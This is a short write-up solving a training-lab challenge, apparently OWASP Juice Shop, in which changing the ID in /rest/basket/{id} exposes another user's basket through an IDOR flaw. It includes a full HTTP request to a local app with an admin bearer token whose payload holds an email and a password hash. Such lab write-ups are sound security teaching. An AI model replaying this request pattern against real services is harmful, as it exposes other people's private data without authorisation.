# View Basket
View another user's shopping basket.

Style: Tutorial, Good For Demos
Topic: Broken Access Control

## Solutions

So in the `ui` our basket is under `/#/basket`, via the `cadio http-proxy` we can view the API call `/rest/basket/1`, it might be the userid, and we might have a IDOR vulnerability. We also know from the JWT that `1` is our user ID (in our case it's admin...)

We just tried doing it with a different number (probably a differnt user) and it worked!!!

```python
GET /rest/basket/2 HTTP/1.1
Host: 127.0.0.1:3000
sec-ch-ua-platform: "macOS"
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDYtMDYgMDk6MzE6MjkuNjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDYtMDYgMDk6MzE6MjkuNjMwICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc4MDc0NTAwM30.A14BC-iHy07sntjH_kcMRaBHP5SsWbTdfhmwuAN4uXam-W4zaIBcDeEEUASTOmPaoIed60IKXCWPr327Pa92-8x41CWN-ZVTo1lzWvkr5-1tQFIoaA_pC19rCkrtLJ_3uAFyljpEmKUdDf9BrLmg-h6bOgGpcJ5YegXIo7WBkNg
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
sec-ch-ua: "Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"
sec-ch-ua-mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
If-None-Match: W/"51e-TNDqHkmZX4DdxMJsxCxNlMvqfN4"
```

**NOTE**: It only worked with an active bearer authorization token (no matter to which user)

Response was a detailed json with other user basket.